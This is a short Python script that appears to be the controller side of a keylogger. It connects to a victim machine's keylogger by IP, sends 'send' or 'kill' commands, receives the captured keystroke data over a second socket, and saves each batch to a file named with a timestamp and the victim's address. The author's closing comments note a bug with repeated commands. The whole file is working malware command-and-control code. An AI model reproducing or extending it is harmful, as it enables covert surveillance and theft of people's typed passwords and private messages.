import socket
import os
import threading
import datetime
def get_data():
    send_host = input("Enter ip of keylogger: ")
    send_sock = socket.socket() #this is the socket to send commands
    send_port = 12344
    addr = (send_host,send_port) # set up the socket to listen on correct ports
    print(send_host +" " + str(send_port))
    send_sock.connect(addr)
    rec_sock = socket.socket() #This is the socket to recieve commands
    rec_port = 12345
    rec_host =''
    rec_sock.bind((rec_host,rec_port))
    rec_sock.listen(1)
    while True:
        cmd = input("Enter command(send/kill): ") #Get command from user
        send_sock.send(str.encode(cmd)) # send that command to the keylogger
        if(cmd =="send"):
            print("Command sent send")
            con,addr = rec_sock.accept() #accept the incoming connection
            data = con.recv(1024) # get the data
            f = open(str(datetime.datetime.now())+":"+addr[0]+".txt","w") #create a new file
            while(data):
                f.write(data.decode()) #write the data
                print(data.decode())
                data = con.recv(1024) # get the next chunk of data
            f.close() #close the file once done
        
get_data()

#For some reason you cant send multiple commands when running the same program
#If you exit and restart you can send another command
#I suspect this is due to a problem with how I did the sockets. I'll have to lopok into it